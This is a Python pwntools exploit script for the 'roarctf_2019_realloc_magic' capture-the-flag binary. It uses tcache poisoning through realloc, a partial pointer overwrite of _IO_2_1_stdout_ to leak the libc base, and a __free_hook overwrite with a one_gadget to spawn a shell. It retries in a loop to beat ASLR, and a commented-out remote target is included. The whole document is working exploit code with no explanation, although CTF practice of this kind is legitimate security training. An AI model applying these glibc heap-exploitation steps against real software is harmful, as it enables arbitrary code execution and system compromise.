from pwn import *

context(arch='amd64', os='linux') #, log_level='debug')

file_name = './roarctf_2019_realloc_magic'
'''
debug = 0
if debug:
    r = remote()
else:
    r = process(file_name)
'''
elf = ELF(file_name)

def dbg():
    gdb.attach(r)

menu = '>> '

def add(size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Size?', str(size))
    r.sendafter('Content?', content)

def delete():
    r.sendlineafter(menu, '2')

def ba():
    r.sendlineafter(menu, '666')

'''
size == 0 && ptr != NULL   delete
ptr == NULL                 malloc(size)
size > old_size             edit(size > old_size)
'''

def attack():
    add(0x30, '\x00')
    add(0, '')  #free

    add(0x80, '\x00')
    add(0, '')  #free

    add(0x40, '\x00')
    add(0, '')  #free

    add(0x80, '\x00')

    for i in range(7):
        delete()

    add(0, '')  #free to get unstortedbin

    add(0x30, '\x00')

    libc = ELF('./libc-2.27.so')
    _IO_2_1_stdout_s = libc.sym['_IO_2_1_stdout_']
    #p1 = p64(0) * 7 + p64(0x51) + p64(0x7ffff7dd0760)
    p1 = p64(0) * 7 + p64(0x51) + p8(0x60) + p8(0x87)
    add(0x50, p1)
    add(0, '') #free

    add(0x80, '\x00')
    add(0, '') #free

    p1 = p64(0x0FBAD1887) + p64(0) * 3 + p8(0x58)
    add(0x80, p1)

    r.recvuntil('\n')
    #addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x3E82A0
    if libc_base >> 40 != 0x7F:
      exit(0)
    #libc_base = addr - libc.sym['_IO_file_jumps']
    free_hook = libc_base + libc.sym['__free_hook']
    success('free_hook = ' + hex(free_hook))

    one = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = one[1] + libc_base

    ba()

    add(0x10, b'\x00')
    add(0, '')

    add(0x100, '\x00')
    add(0, '')

    add(0x20, '\x00')
    add(0, '')

    add(0x100, '\x00')

    for i in range(7):
        delete()

    add(0, '')
    add(0x10, '\x00')

    p2 = p64(0) * 3 + p64(0x51) + p64(free_hook)
    add(0x50, p2)
    add(0, '')

    add(0x100, '\x00')
    add(0, '')

    add(0x100, p64(one_gadget))

    delete()
    #dbg()

while True:
    try:
        r = process("./roarctf_2019_realloc_magic")#remote('node4.buuoj.cn', 29344)
        attack()
        r.interactive()
        break
    except:
        r.close()

